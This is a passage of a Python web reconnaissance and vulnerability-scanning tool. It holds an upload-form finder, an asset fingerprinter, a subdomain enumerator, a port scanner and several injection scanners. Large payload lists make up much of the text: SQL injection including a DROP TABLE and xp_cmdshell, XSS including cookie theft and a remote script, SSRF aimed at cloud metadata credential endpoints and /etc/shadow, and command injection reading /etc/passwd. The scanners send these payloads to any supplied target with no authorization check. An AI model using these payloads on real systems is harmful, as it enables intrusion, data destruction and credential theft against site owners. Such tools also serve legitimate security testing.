        return upload_forms

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] File Upload Surface Finder for: [cyan]{target}[/cyan][/white]")
        
        # Test common paths that might have upload functionality
        test_paths = [
            "/", "/upload", "/admin", "/user", "/profile", "/dashboard",
            "/admin/upload", "/user/upload", "/files", "/media"
        ]
        
        all_upload_forms = []
        
        with Progress(SpinnerColumn(), TextColumn("Scanning for upload forms..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(test_paths))
            
            for path in test_paths:
                try:
                    url = target.rstrip('/') + path
                    response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                        upload_forms = FileUploadFinder.extract_upload_forms(response.text, response.url)
                        for form in upload_forms:
                            form['found_on'] = response.url
                            all_upload_forms.append(form)
                except Exception:
                    pass
                prog.advance(task)
        
        if all_upload_forms:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Found On", style="cyan")
            table.add_column("Action URL", style="white")
            table.add_column("Method", style="green")
            table.add_column("Enctype", style="yellow")
            table.add_column("File Inputs", style="blue")
            table.add_column("CSRF Protected", style="magenta")
            
            for form in all_upload_forms:
                csrf_text = "Yes" if form['csrf_protected'] else "No"
                csrf_color = "green" if form['csrf_protected'] else "red"
                
                table.add_row(
                    form['found_on'],
                    form['action'],
                    form['method'],
                    form['enctype'],
                    str(form['file_inputs']),
                    f"[{csrf_color}]{csrf_text}[/{csrf_color}]"
                )
            
            console.print(table)
            console.print(f"[green]Found {len(all_upload_forms)} file upload form(s)[/green]")
            
            # Security warnings
            insecure_forms = [f for f in all_upload_forms if not f['csrf_protected']]
            if insecure_forms:
                console.print(f"[red]⚠️  {len(insecure_forms)} form(s) without CSRF protection![/red]")
        else:
            console.print("[yellow]No file upload forms found[/yellow]")

class StaticAssetFingerprinter:
    LIBRARY_PATTERNS = {
        "jQuery": r"jQuery v?([0-9][0-9A-Za-z.\-_+]*)",
        "Angular": r"Angular(?:JS)?[^0-9]*([0-9][0-9A-Za-z.\-_+]*)",
        "React": r"React v?([0-9][0-9A-Za-z.\-_+]*)",
        "Vue": r"Vue\.?js v?([0-9][0-9A-Za-z.\-_+]*)",
        "Bootstrap": r"Bootstrap v?([0-9][0-9A-Za-z.\-_+]*)",
        "Lodash": r"lodash(?:\.js)? v?([0-9][0-9A-Za-z.\-_+]*)",
        "Moment": r"Moment(?:\.js)? v?([0-9][0-9A-Za-z.\-_+]*)"
    }

    @staticmethod
    def extract_static_assets(html, base_url):
        import re
        from urllib.parse import urljoin
        
        asset_pattern = re.compile(
            r"<(?:script|link)[^>]+(?:src|href)=['\"]([^'\"]+\.(?:js|css))['\"]", re.I
        )
        
        assets = []
        for match in asset_pattern.finditer(html):
            asset_url = urljoin(base_url, match.group(1))
            assets.append(asset_url)
        
        return list(set(assets))

    @staticmethod
    def fingerprint_asset(url, timeout=10):
        try:
            response = requests.get(url, timeout=timeout, verify=False)
            if response.status_code == 200:
                content = response.text[:10000]  # First 10KB for fingerprinting
                
                detected_libs = []
                for lib_name, pattern in StaticAssetFingerprinter.LIBRARY_PATTERNS.items():
                    import re
                    match = re.search(pattern, content, re.I)
                    if match:
                        version = match.group(1)
                        detected_libs.append((lib_name, version))
                
                return {
                    'url': url,
                    'status_code': response.status_code,
                    'size': len(response.content),
                    'libraries': detected_libs,
                    'content_type': response.headers.get('Content-Type', '')
                }
        except Exception:
            pass
        
        return {
            'url': url,
            'status_code': 'ERROR',
            'size': 0,
            'libraries': [],
            'content_type': ''
        }

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Static Asset Fingerprinter for: [cyan]{target}[/cyan][/white]")
        
        try:
            # Get main page
            response = requests.get(target, timeout=10, verify=False)
            if response.status_code != 200:
                console.print(f"[red]HTTP {response.status_code} error[/red]")
                return
            
            # Extract static assets
            assets = StaticAssetFingerprinter.extract_static_assets(response.text, target)
            console.print(f"[white]Found {len(assets)} static asset(s)[/white]")
            
            if not assets:
                console.print("[yellow]No static assets found[/yellow]")
                return
            
            # Fingerprint assets (limit to first 20 for performance)
            fingerprinted_assets = []
            
            with Progress(SpinnerColumn(), TextColumn("Fingerprinting assets..."), console=console, transient=True) as prog:
                task = prog.add_task("", total=min(len(assets), 20))
                
                for asset_url in assets[:20]:
                    result = StaticAssetFingerprinter.fingerprint_asset(asset_url)
                    if result['libraries']:
                        fingerprinted_assets.append(result)
                    prog.advance(task)
            
            if fingerprinted_assets:
                table = Table(show_header=True, header_style="bold white")
                table.add_column("Asset URL", style="cyan")
                table.add_column("Library", style="green")
                table.add_column("Version", style="yellow")
                table.add_column("Size", style="blue")
                
                for asset in fingerprinted_assets:
                    for lib_name, version in asset['libraries']:
                        # Truncate long URLs
                        display_url = asset['url'] if len(asset['url']) <= 60 else asset['url'][:57] + "..."
                        table.add_row(
                            display_url,
                            lib_name,
                            version,
                            f"{asset['size']} bytes"
                        )
                
                console.print(table)
                console.print(f"[green]Identified {sum(len(a['libraries']) for a in fingerprinted_assets)} library version(s)[/green]")
            else:
                console.print("[yellow]No library versions identified in static assets[/yellow]")
                
        except Exception as e:
            console.print(f"[red]Error during analysis: {str(e)}[/red]")

class SubdomainEnumerator:
    
    COMMON_SUBS = [
        'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
        'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
        'dev', 'demo', 'stage', 'staging', 'beta', 'prod', 'production', 'api', 'vpn',
        'admin', 'portal', 'secure', 'vpn', 'remote', 'dashboard', 'monitor', 'cdn',
        'static', 'images', 'img', 'assets', 'media', 'files', 'upload', 'mobile',
        'support', 'help', 'docs', 'doc', 'wiki', 'blog', 'news', 'shop', 'store',
        'status', 'statuspage', 'billing', 'payments', 'auth', 'login', 'register',
        'account', 'app', 'apps', 'tool', 'tools', 'git', 'gitlab', 'github', 'svn',
        'jenkins', 'ci', 'db', 'database', 'sql', 'mysql', 'internal', 'intranet',
        'corp', 'corporate', 'staff', 'employee', 'hr', 'careers', 'jobs', 'marketing',
        'sales', 'partners', 'affiliate', 'download', 'downloads', 'packages', 'registry',
        'chat', 'messenger', 'talk', 'slack', 'jira', 'confluence', 'crm', 'erp'
    ]

    @staticmethod
    def check_subdomain_worker(args):
        subdomain, domain, timeout = args
        full_domain = f"{subdomain}.{domain}"
        try:
            ip = socket.gethostbyname(full_domain)
            return (full_domain, ip, "Active")
        except Exception:
            return None
    
    @staticmethod
    def fetch_crt_sh(domain, timeout=15):
        subdomains = set()
        try:
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            proxies = get_proxy_dict()
            response = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
            
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    for name in name_value.split('\n'):
                        name = name.strip().lower()
                        if name.endswith(domain) and '*' not in name:
                            subdomains.add(name)
        except Exception:
            pass
        
        return list(subdomains)
    
    @staticmethod
    def fetch_hackertarget(domain, timeout=10):
        subdomains = set()
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
            proxies = get_proxy_dict()
            response = requests.get(url, timeout=timeout, proxies=proxies)
            
            if response.status_code == 200 and 'error' not in response.text.lower():
                for line in response.text.splitlines():
                    if ',' in line:
                        subdomain = line.split(',')[0].strip().lower()
                        if subdomain.endswith(domain):
                            subdomains.add(subdomain)
        except Exception:
            pass
        
        return list(subdomains)
    
    @staticmethod
    def run(target):
        domain = clean_domain_input(target)
        console.print(f"[white][*] Advanced Subdomain Enumeration for: [cyan]{domain}[/cyan][/white]")
        
        all_subdomains = set()
        
        console.print("[white]Fetching from Certificate Transparency logs...[/white]")
        ct_subs = SubdomainEnumerator.fetch_crt_sh(domain)
        if ct_subs:
            all_subdomains.update(ct_subs)
            console.print(f"[green]Found {len(ct_subs)} subdomain(s) from CT logs[/green]")
        
        console.print("[white]Fetching from HackerTarget API...[/white]")
        ht_subs = SubdomainEnumerator.fetch_hackertarget(domain)
        if ht_subs:
            all_subdomains.update(ht_subs)
            console.print(f"[green]Found {len(ht_subs)} subdomain(s) from HackerTarget[/green]")
        
        console.print("[white]Performing DNS brute force resolution...[/white]")
        
        verified_subdomains = []
        
        brute_list = [f"{sub}.{domain}" for sub in SubdomainEnumerator.COMMON_SUBS]
        check_list = list(all_subdomains) + brute_list
        check_list = list(set(check_list))
        
        with Progress(SpinnerColumn(), TextColumn("Verifying subdomains..."), BarColumn(), TextColumn("{task.completed}/{task.total} checks"), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(check_list))
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                # Use subdomain as the subdomain arg, but here check_list contains full domains mostly
                # We need to adapt the worker or the args.
                # Actually check_list contains full domains like 'www.example.com' or 'sub.example.com'
                # The worker expects (sub, domain) to join them, but if we pass empty domain it might work or we adjust worker.
                # Let's adjust args to be cleaner.
                
                # Helper to split mostly for brute force logic, but here we have mixed list.
                # Simplest way: Modify worker to take full domain directly?
                # No, I cannot modify worker in the middle of run without redefining class.
                # I will pass empty string as second arg to worker if list item is full domain.
                
                # Check worker logic: full_domain = f"{subdomain}.{domain}"
                # If domain is "", it becomes "sub.example.com.", which is valid DNS.
                
                args = []
                for item in check_list:
                    args.append((item, "", 5))
                
                for result in executor.map(SubdomainEnumerator.check_subdomain_worker, args):
                    if result:
                        # Clean trailing dot if exists (from the empty domain hack)
                        name = result[0].rstrip('.')
                        verified_subdomains.append((name, result[1], result[2]))
                    prog.advance(task)
        
        if verified_subdomains:
            verified_subdomains.sort(key=lambda x: x[0])
            
            table = Table(title=f"Discovered Subdomains for {domain}", show_header=True, header_style="bold white")
            table.add_column("Subdomain", style="green", width=40)
            table.add_column("IP Address", style="cyan", width=15)
            table.add_column("Status", style="yellow", width=10)
            
            # Deduplicate by name
            seen_names = set()
            unique_results = []
            
            for sub, ip, status in verified_subdomains:
                if sub not in seen_names:
                    unique_results.append((sub, ip, status))
                    seen_names.add(sub)
            
            for sub, ip, status in unique_results:
                table.add_row(sub, ip, status)
            
            console.print(table)
            console.print(f"\n[bold green]Total: {len(unique_results)} active subdomain(s) found[/bold green]")
            console.print(f"[white]Total checked: {len(check_list)} potential targets[/white]")
        else:
            console.print("[yellow]No active subdomains found[/yellow]")

class PortScanner:
    TOP_100_PORTS = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 81: 'HTTP-Alt',
        110: 'POP3', 111: 'RPC', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
        445: 'SMB', 465: 'SMTP-SSL', 587: 'SMTP-Submission', 993: 'IMAP-SSL', 995: 'POP3-SSL',
        1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP', 2049: 'NFS',
        2082: 'cPanel', 2083: 'cPanel-SSL', 2086: 'WHM', 2087: 'WHM-SSL',
        2181: 'ZooKeeper', 2375: 'Docker', 2376: 'Docker-SSL', 2525: 'SMTP-Alt',
        3000: 'Node.js/Rails', 3128: 'Squid', 3306: 'MySQL', 3389: 'RDP', 3690: 'SVN',
        4000: 'Hexo/Jekyll', 4200: 'Angular', 4444: 'Metasploit', 4567: 'Galera',
        5000: 'Flask/UPnP', 5432: 'PostgreSQL', 5601: 'Kibana', 5672: 'AMQP',
        5900: 'VNC', 5984: 'CouchDB', 6379: 'Redis', 6667: 'IRC', 7000: 'Cassandra',
        7001: 'WebLogic', 8000: 'HTTP-Alt', 8008: 'HTTP-Alt', 8080: 'HTTP-Proxy',
        8081: 'McAfee/Nexus', 8088: 'Radan', 8443: 'HTTPS-Alt', 8500: 'Consul',
        8888: 'Jupyter/HTTP', 9000: 'SonarQube/Portainer', 9042: 'Cassandra',
        9090: 'Prometheus', 9092: 'Kafka', 9200: 'Elasticsearch', 9418: 'Git',
        10000: 'Webmin', 11211: 'Memcached', 27017: 'MongoDB', 27018: 'MongoDB',
        50000: 'SAP', 50070: 'Hadoop'
    }

    @staticmethod
    def scan_single_port(ip, port, timeout=1.5):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    try:
                        service = PortScanner.TOP_100_PORTS.get(port, 'Unknown')
                        banner = ""
                        # Try simple banner grab
                        if port in [21, 22, 23, 25, 110, 143, 3306, 5432, 6379]:
                            try:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            except: pass
                        
                        if not banner and port in [80, 8080, 443, 8443]:
                             # Minimal HTTP check for banner
                             try:
                                 sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                 data = sock.recv(256).decode('utf-8', errors='ignore')
                                 if 'Server:' in data:
                                     banner = data.split('Server:')[1].split('\r\n')[0].strip()
                             except: pass

                        return (port, service, banner[:50] if banner else "")
                    except Exception:
                        return (port, PortScanner.TOP_100_PORTS.get(port, "Unknown"), "")
        except Exception:
            pass
        return None

    @staticmethod
    def run(target):
        domain = clean_domain_input(target)
        ip = resolve_to_ip(domain)
        
        if not ip:
            console.print("[red]Failed to resolve domain to IP[/red]")
            return
        
        console.print(f"[white][*] Advanced Port Scanning (Top 100): [cyan]{domain}[/cyan] ({ip})[/white]")
        
        open_ports = []
        port_list = sorted(PortScanner.TOP_100_PORTS.keys())
        
        with Progress(SpinnerColumn(), TextColumn("Scanning ports..."), BarColumn(), TextColumn("{task.completed}/{task.total} ports"), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(port_list))
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
                futures = {executor.submit(PortScanner.scan_single_port, ip, port): port for port in port_list}
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        open_ports.append(result)
                    prog.advance(task)
        
        if open_ports:
            open_ports.sort(key=lambda x: x[0])
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Port", style="cyan", justify="right", width=6)
            table.add_column("Service", style="green", width=15)
            table.add_column("Status", style="yellow", width=8)
            table.add_column("Banner/Version", style="white")
            
            for port, service, banner in open_ports:
                table.add_row(str(port), service, "[green]Open[/green]", banner or "N/A")
            
            console.print(table)
            console.print(f"[green]Found {len(open_ports)} open port(s)[/green]")
        else:
            console.print("[yellow]No open ports found in top 100[/yellow]")

class WebTechDetector:
    
    @staticmethod
    def detect_frameworks(html_content, headers):
        frameworks = []
        
        # Framework signatures
        signatures = {
            'Laravel': ['laravel_session', 'XSRF-TOKEN'],
            'Django': ['csrftoken', 'django'],
            'Flask': ['flask', 'werkzeug'],
            'Express.js': ['express', 'x-powered-by: Express'],
            'Spring': ['spring', 'jsessionid'],
            'Ruby on Rails': ['_rails_session', 'rails'],
            'ASP.NET Core': ['aspnetcore', '.aspnetcore'],
            'Next.js': ['__next', '_next/static'],
            'Nuxt.js': ['__nuxt', '_nuxt'],
            'Gatsby': ['gatsby', 'webpack'],
        }
        
        html_lower = html_content.lower()
        headers_str = str(headers).lower()
        
        for framework, patterns in signatures.items():
            for pattern in patterns:
                if pattern.lower() in html_lower or pattern.lower() in headers_str:
                    frameworks.append(framework)
                    break
        
        return frameworks
    
    @staticmethod
    def detect_analytics(html_content):
        analytics = []
        
        analytics_patterns = {
            'Google Analytics': ['google-analytics.com', 'gtag', 'ga.js'],
            'Google Tag Manager': ['googletagmanager.com', 'gtm.js'],
            'Facebook Pixel': ['facebook.net/en_US/fbevents.js', 'fbq('],
            'Hotjar': ['hotjar.com', 'hjid'],
            'Mixpanel': ['mixpanel.com', 'mixpanel'],
            'Segment': ['segment.com', 'analytics.js'],
            'Matomo': ['matomo', 'piwik'],
        }
        
        html_lower = html_content.lower()
        
        for tool, patterns in analytics_patterns.items():
            for pattern in patterns:
                if pattern.lower() in html_lower:
                    analytics.append(tool)
                    break
        
        return analytics
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Web Technology Detection for: [cyan]{target}[/cyan][/white]")
        
        try:
            response = requests.get(target, timeout=10, verify=False)
            html_content = response.text
            headers = response.headers
            
            frameworks = WebTechDetector.detect_frameworks(html_content, headers)
            analytics = WebTechDetector.detect_analytics(html_content)
            
            # Display frameworks
            if frameworks:
                fw_table = Table(title="Detected Frameworks", show_header=True, header_style="bold white")
                fw_table.add_column("Framework", style="green")
                
                for fw in frameworks:
                    fw_table.add_row(fw)
                
                console.print(fw_table)
            
            # Display analytics
            if analytics:
                an_table = Table(title="Detected Analytics", show_header=True, header_style="bold white")
                an_table.add_column("Analytics Tool", style="cyan")
                
                for tool in analytics:
                    an_table.add_row(tool)
                
                console.print(an_table)
            
            if not frameworks and not analytics:
                console.print("[yellow]No specific frameworks or analytics detected[/yellow]")
                
        except Exception as e:
            console.print(f"[red]Error: {str(e)}[/red]")

class SQLInjectionScanner:
    
    # Comprehensive SQL Injection Payloads
    SQL_PAYLOADS = [
        # Basic SQL Injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        
        # UNION-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        
        # Boolean-based blind
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        
        # Time-based blind
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        
        # Error-based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('whoami')--",
        
        # Authentication bypass
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "' OR 'a'='a",
        "' OR 'a'='a'--",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        
        # NoSQL Injection
        "' || '1'=='1",
        "' || '1'=='1'--",
        "' && '1'=='1",
        "' && '1'=='1'--",
        
        # Special characters
        "'",
        "''",
        "'\"",
        "';--",
        "'#",
        "'/*",
        "' OR ''",
        "' OR '' --"
    ]
    
    @staticmethod
    def test_sql_injection(url, timeout=10):
        vulnerable_params = []
        
        try:
            # Parse URL and get parameters
            parsed = urlparse(url)
            if not parsed.query:
                return vulnerable_params
            
            # Test each payload
            for payload in SQLInjectionScanner.SQL_PAYLOADS:
                test_url = url + payload
                try:
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check for SQL error messages
                    error_patterns = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'syntax error', 'odbc', 'jdbc', 'warning: mysql'
                    ]
                    
                    content_lower = response.text.lower()
                    for pattern in error_patterns:
                        if pattern in content_lower:
                            vulnerable_params.append({
                                'payload': payload,
                                'pattern': pattern,
                                'url': test_url
                            })
                            break
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable_params
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] SQL Injection Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        # Test common endpoints
        test_urls = [
            f"{target}/?id=1",
            f"{target}/search?q=test",
            f"{target}/login?user=admin",
        ]
        
        all_vulnerabilities = []
        
        for test_url in test_urls:
            vulns = SQLInjectionScanner.test_sql_injection(test_url)
            all_vulnerabilities.extend(vulns)
        
        if all_vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Payload", style="red")
            table.add_column("Error Pattern", style="yellow")
            table.add_column("URL", style="cyan", overflow="fold")
            
            for vuln in all_vulnerabilities:
                table.add_row(vuln['payload'], vuln['pattern'], vuln['url'])
            
            console.print(table)
            console.print(f"[red]Potential SQL injection vulnerabilities found: {len(all_vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious SQL injection vulnerabilities detected[/green]")

class XSSScanner:
    
    # Comprehensive XSS Payloads
    XSS_PAYLOADS = [
        # Basic script tags
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script src=//xss.rocks/xss.js></script>",
        
        # IMG tag variations
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<img/src=x onerror=alert(1)>",
        "<img src=x:alert(1) onerror=eval(src)>",
        "<img src=x onerror=\"alert('XSS')\">",
        
        # SVG variations
        "<svg/onload=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1)>",
        
        # Body tag
        "<body onload=alert('XSS')>",
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        
        # Input variations
        "<input onfocus=alert(1) autofocus>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<input type=\"text\" value=\"XSS\" onfocus=alert(1) autofocus>",
        
        # iFrame variations
        "<iframe src=javascript:alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        
        # Event handlers
        "<div onmouseover=alert(1)>hover</div>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        
        # JavaScript protocol
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)",
        
        # Data URI
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        
        r"jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        
        # Filter bypass
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        
        # Encoded payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\x3cscript\x3ealert('XSS')\x3c/script\x3e",
        
        # DOM-based
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        
        # Template injection
        "{{alert(1)}}",
        "${alert(1)}",
        "<%= alert(1) %>",
        
        # Special cases
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">",
        "<form action=\"javascript:alert(1)\"><input type=submit>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<video><source onerror=\"alert(1)\">"
    ]
    
    @staticmethod
    def test_xss(url, timeout=10):
        vulnerable = []
        
        try:
            for payload in XSSScanner.XSS_PAYLOADS:
                test_url = f"{url}?test={payload}"
                try:
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        vulnerable.append({
                            'payload': payload,
                            'url': test_url,
                            'reflected': True
                        })
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] XSS Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        vulnerabilities = XSSScanner.test_xss(target)
        
        if vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Payload", style="red")
            table.add_column("Reflected", style="yellow")
            table.add_column("Test URL", style="cyan", overflow="fold")
            
            for vuln in vulnerabilities:
                reflected = "[red]Yes[/red]" if vuln['reflected'] else "[green]No[/green]"
                table.add_row(vuln['payload'], reflected, vuln['url'])
            
            console.print(table)
            console.print(f"[red]Potential XSS vulnerabilities found: {len(vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious XSS vulnerabilities detected[/green]")

class SSRFScanner:
    
    # Comprehensive SSRF Payloads
    SSRF_PAYLOADS = [
        # Localhost variations
        "http://localhost",
        "http://127.0.0.1",
        "http://127.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://[::]",
        "http://0000::1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        
        # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        
        # GCP metadata
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata/computeMetadata/v1/",
        
        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
        
        # DigitalOcean metadata
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        
        # File protocol
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system32/drivers/etc/hosts",
        
        # Internal network
        "http://192.168.0.1",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        
        # DNS rebinding
        "http://spoofed.burpcollaborator.net",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        
        # Protocol smuggling
        "gopher://127.0.0.1:6379/_FLUSHALL",
        "dict://127.0.0.1:11211/stats",
        "sftp://127.0.0.1:22",
        "tftp://127.0.0.1:69/file",
        "ldap://127.0.0.1:389",
        
        # Bypass techniques
        "http://127.0.0.1.xip.io",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.sslip.io",
        "http://0x7f000001",
        "http://2130706433",
        "http://017700000001",
        "http://127.1.1.1",
        
        # URL encoding bypass
        "http://127.0.0.1%00.example.com",
        "http://127.0.0.1%2F.example.com",
        "http://127.0.0.1%23.example.com",
        
        # Redirect chains
        "http://redirect.example.com?url=http://127.0.0.1",
        "http://redirect.example.com?url=http://169.254.169.254"
    ]
    
    @staticmethod
    def test_ssrf(url, timeout=10):
        vulnerable = []
        
        try:
            for payload in SSRFScanner.SSRF_PAYLOADS:
                test_url = f"{url}?url={payload}"
                try:
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check for indicators of SSRF
                    indicators = ['root:', 'localhost', 'metadata', '127.0.0.1']
                    
                    for indicator in indicators:
                        if indicator in response.text.lower():
                            vulnerable.append({
                                'payload': payload,
                                'indicator': indicator,
                                'status_code': response.status_code
                            })
                            break
                except Exception:
                    continue
        except Exception:
            pass
        
        return vulnerable
    
    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] SSRF Scanner for: [cyan]{target}[/cyan][/white]")
        console.print("[yellow]Note: This is a basic scanner for educational purposes only[/yellow]")
        
        vulnerabilities = SSRFScanner.test_ssrf(target)
        
        if vulnerabilities:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Payload", style="red")
            table.add_column("Indicator", style="yellow")
            table.add_column("Status Code", style="cyan")
            
            for vuln in vulnerabilities:
                table.add_row(vuln['payload'], vuln['indicator'], str(vuln['status_code']))
            
            console.print(table)
            console.print(f"[red]Potential SSRF vulnerabilities found: {len(vulnerabilities)}[/red]")
        else:
            console.print("[green]No obvious SSRF vulnerabilities detected[/green]")

class CommandInjectionScanner:
    
    # Command Injection Payloads
    CMD_PAYLOADS = [
        # Unix/Linux commands
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        
        # Windows commands
        "& dir",
        "| dir",
        "&& dir",
        "; dir",
        "& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        
        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        
        # Encoded payloads
        "%3B%20ls",
        "%7C%20ls",
        "%26%20ls",
        
        # Newline injection
        "%0Als",
        "%0Dwhoami",
        "\\nls",
        "\\r\\nwhoami"
    ]
    
    @staticmethod
    def test_command_injection(url, timeout=10):
